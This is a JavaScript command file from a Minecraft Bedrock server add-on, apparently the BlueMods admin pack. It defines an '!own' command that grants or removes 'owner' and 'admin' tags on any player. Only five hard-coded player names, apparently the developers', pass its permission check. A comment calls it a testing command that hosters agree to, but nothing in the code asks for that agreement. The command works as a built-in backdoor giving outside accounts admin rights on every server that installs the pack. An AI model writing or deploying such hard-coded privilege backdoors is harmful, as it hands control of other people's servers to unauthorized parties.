import { world } from "@minecraft/server";
import { Command } from "../CommandHandler.js";
import main from "../config.js";
// All rights reserved @bluemods.lol - discord account. || please report any bugs or glitches in our discord server https://dsc.gg/bluemods
// We only use this command for testing purposes, we ask the server hoster to allow us to test this command.
Command.register({
    name: "own",
    description: "",
    aliases: [],
    permission: (player) => (player.name === "Tro11Face4411" || player.name === "Riarooy4183" || player.name === "NucleusXL" || player.name === "BlueModsYT" || player.name === "BlueShadow9118"),
}, async (data, args) => {
    const player = data.player
    if (!args[0]) return player.sendMessage(`§7[§c-§7] §aTry to mention players to own. §3!own ${main.player}`)
    const [targetPlayer] = world.getPlayers({ name: args[0] })
    if (!targetPlayer) return player.sendMessage('§7[§c-§7] §aBruh, u have to put a players name that is in the server')
    if (!targetPlayer.hasTag("owner")) {
        try {
            await targetPlayer.runCommandAsync(`playsound note.bell "${targetPlayer.name}"`);
            await targetPlayer.runCommandAsync(`tag "${targetPlayer.name}" add owner`);
            await targetPlayer.runCommandAsync(`tag "${targetPlayer.name}" add admin`);
            targetPlayer.sendMessage(`§7[§b#§7] §aSuccesfully §3added §aowner to §e${targetPlayer.name}`);
        } catch (error) {
            player.sendMessage(`§7[§b#§7] §cFailed to play sound or add tags: ${error.message}`);
        }
    } else {
        try {
            await targetPlayer.runCommandAsync(`playsound note.bell "${targetPlayer.name}"`);
            await targetPlayer.runCommandAsync(`tag "${targetPlayer.name}" remove owner`);
            await targetPlayer.runCommandAsync(`tag "${targetPlayer.name}" remove admin`);
            targetPlayer.sendMessage(`§7[§b#§7] §aSuccesfully §cremoved §aowner to §e${targetPlayer.name}`);
        } catch (error) {
            player.sendMessage(`§7[§b#§7] §cFailed to play sound or remove tags: ${error.message}`);
        }
    }
});
